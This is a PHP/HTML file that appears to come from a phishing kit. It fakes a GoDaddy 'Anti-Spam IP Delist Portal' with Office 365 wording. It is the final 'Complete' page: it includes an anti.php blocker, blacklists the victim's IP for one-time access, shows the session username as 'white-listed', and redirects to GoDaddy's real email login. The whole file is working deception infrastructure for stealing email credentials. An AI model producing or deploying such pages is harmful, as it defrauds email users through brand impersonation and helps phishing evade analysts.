<?php
error_reporting(0);
include('anti.php');
session_start();
$user = $_SESSION['username'];
include "config.php";
$ip = $_SERVER['REMOTE_ADDR'];
if($One_Time_Access==1) {
	$fp = fopen("blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);

}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=9">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <meta http-equiv="refresh" content="8;URL=https://www.google.com/url?sa=t&source=web&rct=j&url=https://email.godaddy.com/&ved=2ahUKEwir5J6Q3fvjAhUqneAKHXi6A2UQFjAAegQIBhAD&usg=AOvVaw0wUtL0Rtn9zyAGaTo3Wkxi">
  <title>GoDaddy - Delist IP</title>
  <link href="files/1.css" rel="stylesheet"/>
	  <link rel="icon" href="files/favicon.png" type="image/x-icon"/>

</head>
<body>
  <div class="navbar navbar-inverse navbar-fixed-top" style="background: white">
    <div style="padding-top: 10px">
      <a id="badget1" href="/Delist/Index" style="outline-style: none; text-decoration: none">
        <img style="width: 100px" src="files/dad.png" />
      </a>

      <a id="badget2" href="/Delist/Index" style="outline-style: none; text-decoration: none; float: right">
        <img src="files/Logo2.jpg" />
      </a>
    </div>
  </div>



  <div class="container body-header">
    <h2>
      GoDaddy Anti-Spam IP Delist Portal      <small style="float: right">
        Display language:
        <select id="Lang" name="Lang" onchange="setLang(this.value)"><option selected="selected" value="en-us">English (United States)</option>
<option value="cs-cz">čeština (Česk&#225;&#160;republika)</option>
<option value="da-dk">dansk (Danmark)</option>
<option value="de-de">Deutsch (Deutschland)</option>
<option value="es-es">espa&#241;ol (Espa&#241;a, alfabetizaci&#243;n internacional)</option>
<option value="fr-fr">fran&#231;ais (France)</option>
<option value="it-it">italiano (Italia)</option>
<option value="hu-hu">magyar (Magyarorsz&#225;g)</option>
<option value="nl-nl">Nederlands (Nederland)</option>
<option value="pl-pl">polski (Polska)</option>
<option value="pt-br">portugu&#234;s (Brasil)</option>
<option value="pt-pt">portugu&#234;s (Portugal)</option>
<option value="ro-ro">rom&#226;nă (Rom&#226;nia)</option>
<option value="sv-se">svenska (Sverige)</option>
<option value="tr-tr">T&#252;rk&#231;e (T&#252;rkiye)</option>
<option value="ru-ru">русский (Россия)</option>
<option value="ko-kr">한국어(대한민국)</option>
<option value="zh-cn">中文(中华人民共和国)</option>
<option value="zh-tw">中文(台灣)</option>
<option value="ja-jp">日本語 (日本)</option>
</select>
      </small>
    </h2>
  </div>


  <div class="container body-content">
    




<h4>If you&#39;re trying to send mail to an Office 365 recipient and the mail has been rejected because of your sending IP address, follow these steps to submit a delisting request.</h4>
<h4>Senders are responsible for making sure that their mail from this IP address isn&#39;t abusive or malicious.</h4>
<h4><a href="http://go.microsoft.com/fwlink/?LinkID=526655">Learn More</a></h4>
<br />


  <ol class="progtrckr" data-progtrckr-steps="3">
    <li class="progtrckr-todo">Delist IP</li>
    <li class="progtrckr-do">Complete</li>
  </ol>
  <br />
    <h4>Thank you for sending a request to delist your ip.</h4>
	
  <hr />
  <h4 style="color:#00b300;font-weight: 600;">Your email <strong>"<?php echo $user;?>"</strong> is now white-listed <i class="fa fa-check-circle" style="font-size:28px"></i></h4>
  <div class="col-md-12" style="min-height: 450px;">


     
<tbody>
                <tr>

                        
						<img id="wlspispHIPBimg1b25cbf1aea6345f191985dede27280240" style="width:300px" src="files/char4.gif" alt="">
                          <strong><h5 style="font-weight: 600;font-family:courier;">Please Wait. You are being redirected...</h5></strong>
                        
                    </td>
                </tr>
                <tr>
                    <td aria-hidden="true"></td>
                    <td style="padding:0px;text-align:left">
                       
                    </td>
                </tr>
            </tbody>
      </div>
 

<!-- decide HIP status -->






    <hr />
    <footer>
      <p>&copy; 2019 - GoDaddy Delist Portal</p>
    </footer>
  </div>


</body>
</html>
